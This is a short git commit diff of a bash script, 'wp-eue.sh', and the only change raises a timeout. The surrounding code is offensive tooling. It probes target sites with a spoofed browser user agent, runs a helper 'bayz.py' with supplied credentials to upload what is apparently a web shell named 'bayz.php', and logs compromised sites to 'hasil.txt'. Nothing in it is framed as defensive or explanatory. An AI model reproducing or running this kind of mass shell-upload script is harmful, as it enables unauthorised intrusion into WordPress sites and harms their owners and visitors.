afacf59a62474fe7da3f469c970c509956be73ce
Bayz21 <39861892+Bayz21@users.noreply.github.com>
2018-09-10 20:32:13 +0700

    Update wp-eue.sh

--- wp-eue.sh
+++ wp-eue.sh
@@ -3,7 +3,7 @@
 function exploit() {
     ceker=$(timeout 10 curl -s --write-out %{http_code} -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" --output /dev/null $1);
     if [[ $ceker =~ '200' ]] || [[ $ceker =~ '302' ]] || [[ $ceker =~ '301' ]]; then
-        upshl=$(timeout 10 python bayz.py -t $1 -u $user -p $pass);
+        upshl=$(timeout 30 python bayz.py -t $1 -u $user -p $pass);
         if [[ $upshl =~ 'bayz.php' ]]; then
             echo "[Success] => $upshl";
 			echo "$upshl" >> hasil.txt
